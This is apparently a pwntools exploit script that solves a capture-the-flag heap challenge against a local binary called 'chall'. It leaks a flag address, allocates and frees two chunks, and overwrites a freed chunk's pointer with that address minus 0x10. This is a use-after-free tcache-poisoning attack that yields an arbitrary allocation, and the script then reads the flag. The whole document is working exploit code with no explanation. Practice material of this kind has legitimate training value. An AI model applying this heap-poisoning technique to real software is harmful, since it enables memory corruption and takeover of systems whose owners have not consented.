from pwn import *


elf = ELF(b"./chall")

p = process(elf.path)

p.recvuntil(b"located at ")
flag_addr  = int(p.recvline()[:-2].decode(),16)
log.info("flag_addr = " + str(hex(flag_addr)))

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b": ")
p.sendline(b"A")

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b": ")
p.sendline(b"B")

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(b"A")

p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(b"B")


p.recvuntil(b"> ")
p.sendline(b"4")
p.recvuntil(b": ")
p.sendline(b"B")
p.recvuntil(b"> ")
p.sendline(p64(flag_addr - 0x10))

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b": ")
p.sendline(b"A")

p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b": ")
p.sendline(b"A")

p.recvuntil(b"> ")
p.sendline(b"3")
p.recvuntil(b": ")
p.sendline(b"A")

p.interactive()


